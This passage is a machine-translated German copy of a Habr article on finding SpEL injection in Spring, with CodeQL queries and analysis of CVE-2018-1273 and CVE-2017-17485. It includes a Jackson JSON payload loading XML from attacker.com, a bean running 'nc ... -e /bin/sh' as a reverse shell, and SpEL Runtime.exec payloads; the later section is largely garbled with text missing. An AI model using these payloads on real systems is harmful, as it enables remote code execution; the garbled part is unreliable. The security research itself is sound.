großartige Möglichkeiten bei der Analyse des Anwendungscodes. </p><br><p>  Was ist eine QL-Anwendungsanalyse? </p><br><p>  Wie bereits erwähnt, müssen Sie zunächst einen Snapshot der Anwendung erstellen. </p><br><p>  Wenn der Snapshot fertig ist und dies mehrere Stunden dauern kann, können Sie eine SQL-ähnliche Abfrage als Teil der QL-Syntax schreiben.  Dazu können Sie das Plugin für Eclipse verwenden oder direkt in der Konsole auf der Projekt-QL-Seite agieren. </p><br><p>  Weil  Jetzt betrachten wir Spring, und dies ist das Framework für Java. Sie müssen die für Sie interessante Klasse und die Methode aus dieser Klasse beschreiben, deren Aufruf als anfällig angesehen wird.  Für uns ist dies jede Klasse, die eine Methode enthält, die ExpressionParser aufruft. </p><br><p>  Anschließend treffen wir eine Auswahl aller Methoden, die unseren Anforderungen entsprechen, indem wir beispielsweise das Auftreten einer Variablen in einer Methode beschreiben, die bereinigen würde, und die Bedingung, nicht in diese Methode zu fallen. </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p>  Was muss also getan werden, um die CVE-Sicherheitsanfälligkeit 2018-1273 zu finden? <br>  Nachdem wir das Projektimage erhalten und verbunden haben, verwenden wir die QL-Konsole, um den Anrufbaum zu beschreiben, der uns interessiert.  Dafür: <br>  Wir beschreiben die Expression-Parser-Klasse: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p>  Und die Methoden, die für die Ausführung innerhalb der ExpressionParser-Klasse verwendet werden können: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p>  Jetzt müssen Sie diese Beschreibungen miteinander verbinden und eine Auswahl treffen: </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p>  Eine solche Abfrage gibt alle Methoden zurück, die mit parse oder mit dem Namen doParseExpression beginnen und zur ExpressionParser-Klasse gehören.  Aber das ist zu viel, sagst du, und du wirst recht haben.  Ein Filter ist erforderlich. </p><br><p>  Weil  Im Code gibt es einen Kommentar des Formulars: </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p>  Dies könnte beispielsweise eine Suche nach „Pfad“ in Javadoc sein.  Spring kommentiert seinen Code in sehr hoher Qualität, und wir können Methodenaufrufe mit dem erforderlichen Kommentar finden und gleichzeitig alle in den Tests enthaltenen Methoden entfernen.  All dies kann wie folgt beschrieben werden: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getDoc()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath or </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">this</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDeclaringType</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getDoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getJavadoc</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> DocHasPath ) } }</span></span></code> </pre> <br><p>  Um die Klasse, Methoden und Filter nach Javadoc zu kombinieren, hat die Abfrage für die Auswahl die folgende Form: </p><br><pre> <code class="sql hljs">from ParseExpression expr, CallHasPath c where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser and c = expr.getEnclosingCallable()) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr, c</code> </pre> <br><p>  Dieses Beispiel kann als einfach und im Allgemeinen redundant angesehen werden, um nach einer bestimmten Sicherheitsanfälligkeit zu suchen.  Viel interessanter ist die Suche nach Fehlern beim Schreiben eines Fixes, weil  Darin müssen Sie die Klasse selbst angeben, die für die Prüfung verantwortlich ist, die Methoden, die sie immer aufrufen und die vor der Prüfung ausgeführt werden. </p><br><p>  Ein Aufruf einer Methode, die immer verifyPath aufruft: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">VerifyPathCallerAccess</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ VerifyPathCallerAccess() { exists(VerifyPathActionConf conf | conf.callAlwaysPerformsAction(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>) ) or <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-keyword"><span class="hljs-keyword">instanceof</span></span> VerifyPath } }</code> </pre> <br><p>  Ein Aufruf einer Methode, die vor verifyPath ausgeführt wird: </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">UnsafeEvaluateCall</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ UnsafeEvaluateCall() { ( <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> Evaluate or </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(UnsafeEvaluateCall unsafe | </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">.getMethod()</span></span></span><span class="hljs-function"> </span></span>= unsafe.getEnclosingCallable() ) ) <span class="hljs-function"><span class="hljs-function">and not </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">exists</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(VerifyPathCallerAccess verify | dominates(verify, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">this</span></span></span></span><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> ) } }</span></span></code> </pre> <br><p>  Betrachten Sie eine weitere interessante Sicherheitsanfälligkeit.  Ihr Verständnis ist sehr wichtig, weil  Es zeigt, dass sich der Fehler möglicherweise in einer Bibliothek eines Drittanbieters befindet, und zeigt, wie mit XML-Annotationen versehene Beans verwendet werden können. </p><br><h2 id="jackson-and-bean">  Jackson und Bohne </h2><br><p>  CVE-2017-17485 basiert auf der Verwendung von FileSystemXmlApplicationContext - es handelt sich um einen eigenständigen Anwendungskontext in Form von XML, der Kontextdefinitionsdateien vom Dateisystem oder von der URL empfängt. </p><br><p>  Gemäß der Dokumentation können Sie so Beans aus einer Datei laden und den Anwendungskontext neu laden. <br>  "... Erstellen Sie einen neuen FileSystemXmlApplicationContext, laden Sie die Definitionen aus den angegebenen XML-Dateien und aktualisieren Sie den Kontext automatisch." </p><br><p>  Jackson ist eine Bibliothek, mit der Sie alle Objekte außer den auf der schwarzen Liste aufgeführten Objekten serialisieren und deserialisieren können.  Diese Gelegenheit wird häufig von Angreifern genutzt.  Bei dieser Sicherheitsanfälligkeit musste der Angreifer das Objekt <code>org.springframework.context.support.FileSystemXmlApplicationContext</code> mit einem Wert übergeben, der den Pfad zu der vom Angreifer kontrollierten Datei enthält. </p><br><p>  Das heißt,  Im Anfragetext können Sie den folgenden JSON übergeben: </p><br><pre> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">123</span></span>, <span class="hljs-attr"><span class="hljs-attr">"obj"</span></span>: [<span class="hljs-string"><span class="hljs-string">"org.springframework.context.support.FileSystemXmlApplicationContext"</span></span>, <span class="hljs-string"><span class="hljs-string">"https://attacker.com/spel.xml"</span></span>]}</code> </pre> <br><p>  Spel.xml enthält bin-Parameter: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pb"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.ProcessBuilder"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value-type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"java.lang.String"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>nc<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>XXXX<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>9999<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>-e<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span>/bin/sh<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">value</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">list</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">constructor-arg</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"whatever"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{pb.start()}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">beans</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Weil  Da wir die Bean-Klasse java.lang.ProcessBuilder verwendet haben, die über eine Startmethode verfügt, liest Spring nach dem erneuten Laden des Kontexts den Ausdruck, der ProcessBuilder startet, über die SpEL-Eigenschaft, wodurch der Server gezwungen wird, mit nc eine Verbindung zu uns herzustellen. </p><br><p>  Es lohnt sich, auf die als Beispiel angegebene spel.xml zu achten, z  Es zeigt, wie beim Ausführen des Befehls Parameter übergeben werden. </p><br><p>  Und auf welche andere Weise können wir unsere Bean laden oder den Kontext neu laden? </p><br><p>  Selbst mit einem kurzen Blick auf die Spring-Dokumentation finden Sie einige weitere Klassen, die für uns nützlich sein können. </p><br><p>  ClassPathXmlApplicationContext und AbstractXmlApplicationContext ähneln FileSystem, jedoch werden ClassPath- und XML-annotierte Beans als Pfad zur Konfiguration verwendet. </p><br><p>  Es gibt einen weiteren interessanten Punkt im Zusammenhang mit dem Neuladen des Kontexts - @RefreshScope. </p><br><p>  Alle mit @RefreshScope kommentierten Spring Bean werden zum Startzeitpunkt aktualisiert.  Und alle Komponenten, die es verwenden, erhalten beim nächsten Aufruf der Methode ein neues Objekt. Sie werden vollständig initialisiert und abhängig davon eingeführt. </p><br><p>  RefreshScope ist eine Komponente im Kontext und verfügt über eine öffentliche refreshAll-Methode, mit der alle Komponenten in einem Bereich durch Löschen des Zielcaches aktualisiert werden können.  Daher kann der Benutzer bei Verwendung von @RefreshScope auf die URL verweisen, die mit / refresh endet, und dadurch die mit Anmerkungen versehenen Beans neu laden. </p><br><h2 id="drugie-utility">  Andere Dienstprogramme </h2><br><p>  Es gibt viele andere Plugins und Programme, mit denen Sie den Code analysieren und die Sicherheitsanfälligkeit finden können. </p><br><ul><li>  Jprofiler - wird als separater Anwendungsserver und Plugin für IDE installiert.  Ermöglicht die Analyse einer laufenden Anwendung.  Es ist sehr praktisch, das Verhalten von Objekten durch grafische Darstellung zu analysieren. </li></ul><br><p><img src="https://habrastorage.org/webt/g4/ki/ij/g4kiijoeylzhjo742es00a_ksti.png"></p><br><p>  Von den Minuspunkten - bezahlt, hat aber eine freie Frist von 10 Tagen.  Es gilt als eines der besten Dienstprogramme zur Analyse des Anwendungsverhaltens, nicht nur unter Sicherheitsgesichtspunkten. </p><br><ul><li>  Xrebel - bezahlt, wir haben keine Möglichkeit einer Probezeit gefunden.  Gilt aber auch als einer der besten. </li><li>  Coverity - verwendet seine eigenen Server für die Analyse, daher ist es nur für diejenigen geeignet, die keine Angst haben, ihren Code zu gestalten. </li><li>  Checkmarx - sehr berühmt, bezahlt, kennt viele Sprachen und wirft viele falsch positive Ergebnisse ab.  Es ist jedoch besser, auf den Ort hinzuweisen, an dem die Theorie möglicherweise einen Fehler enthält, als einen echten Fehler zu übersehen. </li><li>  OWASP Dependency Check - wird als praktisches Plug-In für verschiedene Builder bereitgestellt.  Wir haben es geschafft, es bei der Analyse einer Java-Anwendung auf Maven und Ant zu testen.  Unterstützt auch .Net.  Den Ergebnissen der Arbeit zufolge enthält es einen praktischen Bericht, in dem veraltete Bibliotheken und ihnen bekannte Schwachstellen aufgeführt sind. </li><li>  Findbugs - es wurde bereits früher erwähnt.  Es gibt viele Implementierungen, aber die Option findbugs_cli hat sich als die bequemste herausgestellt und zeigt aus irgendeinem Grund mehr Probleme.  Es kann wie folgt verwendet werden: <br><pre> <code class="bash hljs">findsecbugs.bat -progress -html -output report_name.htm <span class="hljs-string"><span class="hljs-string">"path\example.jar"</span></span></code> </pre> </li><li>  LGTM QL - Ein Beispiel für seine Verwendung wurde bereits zuvor gegeben.  Wir möchten separat sagen, dass es auch einen kostenpflichtigen Anwendungsfall gibt, nach dem Sie einen lokalen Server zur Analyse Ihres Codes erhalten. <br> QL    Java,             . </li></ul><br><h1 id="black-box"> Black Box </h1><br><p>  -,   . <br>  ,    : Spring,     SpEL, ,  SpEL API,   -,        . </p><br><p>         spring,      URL,    API.        /metrics  /beans —     Spring Boot Actuator     ,        . </p><br><p>  ,    . </p><br><p>    , SpEL      ,     ,    . </p><br><ul><li>  : <code>var[SpEL]=123</code> </li><li>  : <code>&amp;variable1=123&amp;SpEL=</code> </li><li> : org.springframework.cookie = <code>${}</code> </li><li>     .. </li></ul><br><h2 id="vot-nebolshaya-podborka-s-variantami-peylodov">      : </h2><br><pre> <code class="javascript hljs">${<span class="hljs-number"><span class="hljs-number">1</span></span>+<span class="hljs-number"><span class="hljs-number">3</span></span>} T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">"nslookup !url!"</span></span>) #<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getClass().forName(<span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span>).getRuntime().exec(<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> java.lang.ProcessBuilder({<span class="hljs-string"><span class="hljs-string">'nslookup !url!'</span></span>}).start() ${user.name}</code> </pre> <br><h1 id="ne-spelom-ediny">  SpEL  </h1><br><p>    SpEL    ,   ,     EL Injection.    : OGNL, MVEL, JBoss EL, JSP EL.   -        . </p><br><h1 id="v-kachestve-zaklyucheniya">    </h1><br><p>  ZeroNights  : “ ,  Spring,   SpEL injection?” </p><br><p>   ,    CVE,   .       ,     ,   github. </p><br><p>  ,   ,            SpEL Expression.  Das heißt,  (,   )        ,      . </p><br><p>  Das heißt,            .      ,          ,       “” . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de433034/">https://habr.com/ru/post/de433034/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de433014/index.html">Witze über die jüngste Freilassung von Astronauten in den Weltraum</a></li>
<li><a href="../de433016/index.html">Schnittstellenänderungen, mehrschichtige Animationen und strukturiertes visuelles Chaos: Ein Überblick über Webtrends für 2019</a></li>
<li><a href="../de433018/index.html">UDB. Was ist das Teil 2. Datenpfad</a></li>
<li><a href="../de433030/index.html">Live: Front-End-Leistung</a></li>
<li><a href="../de433032/index.html">Wie medizinisches Routing funktioniert - das zeigen wir am Beispiel der DOC + -Anwendung</a></li>
<li><a href="../de433036/index.html">Tipps zur Organisation der IT in einem kleinen Unternehmen</a></li>
<li><a href="../de433038/index.html">Warum lernen Vermarkter das Programmieren?</a></li>
<li><a href="../de433042/index.html">Intel wird den Prozessor mit dreidimensionaler Architektur Foveros im Jahr 2019 veröffentlichen</a></li>
<li><a href="../de433044/index.html">OpenJDK-Quellcode enthält zu viele Schimpfwörter</a></li>
<li><a href="../de433046/index.html">Die ganze Wahrheit über RTOS. Artikel Nr. 25. Datenkanäle: Einführung und Basisdienste</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>